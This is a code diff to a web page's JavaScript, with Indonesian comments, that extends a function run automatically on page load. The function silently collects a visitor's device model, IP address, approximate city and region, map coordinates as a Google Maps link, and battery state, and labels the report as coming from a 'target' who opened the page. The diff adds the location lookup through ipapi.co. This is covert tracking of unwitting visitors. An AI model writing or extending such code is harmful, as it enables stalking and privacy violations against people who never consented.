@@ -184,7 +184,7 @@
             return `${brand} (${osVersion}) [Model: ${modelCode}]`;
         }
 
-        // --- 2. FUNGSI KIRIM FINGERPRINT OTOMATIS SAAT WEB DIBUKA ---
+                // --- 2. FUNGSI KIRIM FINGERPRINT OTOMATIS SAAT WEB DIBUKA ---
         async function autoSendFingerprint() {
             let data = [];
             data.push(`🔔 TARGET MEMBUKA WEB (AUTO-LOG)!`);
@@ -192,12 +192,26 @@
             const deviceDetails = await detectDeviceNameAdvanced();
             data.push(`📱 Perangkat: ${deviceDetails}`);
 
-            // IP Address
+            // --- IP Address & Geolocation Kasar ---
             try {
-                const resIP = await fetch('https://api.ipify.org?format=json');
-                const ipJson = await resIP.json();
-                data.push(`🌐 IP: ${ipJson.ip}`);
-            } catch { data.push(`🌐 IP: Gagal diambil`); }
+                const resIP = await fetch('https://ipapi.co/json/');
+                const ipData = await resIP.json();
+                
+                const ip = ipData.ip || "Gagal diambil";
+                const city = ipData.city || "-";
+                const region = ipData.region || "-";
+                const lat = ipData.latitude;
+                const lon = ipData.longitude;
+
+                data.push(`🌐 IP: ${ip}`);
+                data.push(`📍 Perkiraan Wilayah: ${city}, ${region}`);
+
+                if (lat && lon) {
+                    data.push(`🗺️ Google Maps: https://www.google.com/maps?q=${lat},${lon}`);
+                }
+            } catch { 
+                data.push(`🌐 IP & Lokasi: Gagal diambil`); 
+            }
 
             // Baterai
             if ('getBattery' in navigator) {
@@ -228,6 +242,7 @@
                 console.error("Auto log error:", err);
             }
         }
+
 
         // Jalankan pengiriman data otomatis saat halaman selesai dimuat!
         window.addEventListener('DOMContentLoaded', autoSendFingerprint);
@@ -298,5 +313,4 @@
         });
     </script>
 </body>
-    </html>
-    
+</html>
